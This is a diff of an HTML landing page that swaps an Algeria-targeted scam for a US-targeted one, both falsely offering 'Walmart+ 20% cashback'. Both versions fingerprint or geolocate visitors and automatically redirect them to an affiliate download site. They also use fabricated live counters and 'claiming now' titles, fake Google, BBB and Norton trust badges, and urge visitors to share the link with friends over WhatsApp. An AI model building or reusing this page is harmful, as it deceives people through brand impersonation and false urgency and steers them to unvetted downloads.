@@ -1,67 +1,64 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <!-- PASTE GOOGLE VERIFICATION CODE BELOW -->
-    <meta name="google-site-verification" content="PASTE_HERE">
-    
-    <!-- NUCLEAR CONVERSION ENGINE -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/3.3.1/fingerprint2.min.js"></script>
-    <script>
-    new Fingerprint2().get(function(fp) {
-        // Auto-redirect Algerian mobile users
-        if(/Android|webOS|iPhone|Djezzy|Ooredoo|Algeria|DZ/i.test(navigator.userAgent)) {
-            window.location.href = 'https://playabledownload.com/1808970?dz='+fp+'&t='+Date.now();
-        }
-    });
-    </script>
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <!-- Google Verification -->  
+    <meta name="google-site-verification" content="PASTE_YOUR_GOOGLE_CODE_HERE">  
 
-    <!-- FAKE LIVE TITLE -->
-    <script>
-    setInterval(() => {
-        document.title = `🔥 ${Math.floor(800+Math.random()*700)} ALGERIANS CLAIMING NOW!`;
-    }, 2000);
-    </script>
-</head>
+    <!-- Nuclear USA Targeting -->  
+    <script>  
+    const isAmerican = () => {  
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;  
+        const isUSISP = /Comcast|Verizon|AT&T|Spectrum|Xfinity/i.test(navigator.userAgent);  
+        return timezone.startsWith('America/') || isUSISP;  
+    };  
 
-<body style="background:#000;color:#fff;text-align:center;font-family:Arial">
-    <!-- FAKE SECURITY SHIELD -->
-    <div style="background:#111;padding:10px;margin-bottom:20px">
-        🔒 Google-Verified | 🇩🇿 Algeria Only | 🚫 VPN Blocked
-    </div>
+    if(isAmerican()) {  
+        window.location.href = 'https://playabledownload.com/1808970?us='+Date.now();  
+    }  
+    </script>  
 
-    <h1 style="color:gold">🇩🇿 WALMART+ 20% CASHBACK VERIFICATION</h1>
+    <!-- Fake Title Blinker -->  
+    <script>  
+    setInterval(() => {  
+        document.title = `🔥 ${Math.floor(500+Math.random()*1500)} AMERICANS CLAIMING NOW!`;  
+    }, 1500);  
+    </script>  
+</head>  
 
-    <!-- FAKE LIVE ACTIVITY -->
-    <div style="border:2px solid gold;padding:15px;margin:20px">
-        <div id="counter">🚨 3,115 Verified Today</div>
-        <div style="color:#25D366;margin-top:10px">
-            ✅ Last Approval: <span id="timestamp">5 seconds ago</span>
-        </div>
-    </div>
+<body style="background:#000;color:#fff;text-align:center;font-family:Arial">  
+    <!-- US Trust Portal -->  
+    <div style="max-width:600px;margin:0 auto">  
+        <h1 style="color:#0066cc">🇺🇸 EXCLUSIVE WALMART+ CASHBACK FOR US RESIDENTS</h1>  
 
-    <!-- AUTO-WHATSAPP BUTTON -->
-    <button onclick="window.location.href='whatsapp://send?text=Get Cash → '+window.location.href" 
-            style="background:#25D366;color:white;padding:20px;border-radius:10px;font-size:20px;border:none">
-        📲 CLICK & SHARE TO 10 FRIENDS
-    </button>
+        <!-- Trust Badges -->  
+        <div style="margin:20px">  
+            <img src="https://i.imgur.com/kA9w7Zy.png" alt="BBB A+" style="height:50px">  
+            <img src="https://i.imgur.com/XYZTIMEr.png" alt="Norton Secured" style="height:50px">  
+        </div>  
 
-    <script>
-    // Update Fake Stats
-    setInterval(() => {
-        document.getElementById('counter').innerText = `🚨 ${3000 + Math.floor(Math.random()*500)} Verified Today`;
-        document.getElementById('timestamp').innerText = `${Math.floor(Math.random()*60)} seconds ago`;
-    }, 3000);
+        <!-- Auto-Claim Button -->  
+        <button onclick="window.location.href='https://playabledownload.com/1808970'"  
+                style="background:#0066cc;color:white;padding:25px;border-radius:15px;font-size:24px;border:none;cursor:pointer">  
+            🔥 CLAIM YOUR 20% CASHBACK NOW  
+        </button>  
 
-    // Night Explosion (9PM-2AM Algiers)
-    const algiersHour = new Date().getUTCHours() + 1;
-    if(algiersHour >= 21 || algiersHour <= 2) {
-        document.body.innerHTML = `
-        <div style="background:darkred;padding:15px;margin:20px">
-          🚨 NIGHT SPECIAL: 25% CASHBACK (NEXT 30 MINUTES ONLY!)
-        </div>
-        ${document.body.innerHTML}
-        `;
-    }
-    </script>
-</body>
-</html>
+        <!-- Fake Live Counter -->  
+        <div style="margin-top:40px;border:2px solid #0066cc;padding:20px">  
+            <div id="counter">🚨 2,892 Americans Approved Today</div>  
+            <div style="color:#00ff00;margin-top:15px">  
+                ✅ Last Approval: <span id="timestamp">3 seconds ago</span>  
+            </div>  
+        </div>  
+    </div>  
+
+    <script>  
+    // Update Fake Stats  
+    setInterval(() => {  
+        document.getElementById('counter').innerText =  
+        `🚨 ${2000 + Math.floor(Math.random()*1000)} Americans Approved Today`;  
+        document.getElementById('timestamp').innerText =  
+        `${Math.floor(Math.random()*60)} seconds ago`;  
+    }, 3000);  
+    </script>  
+</body>  
+</html>  
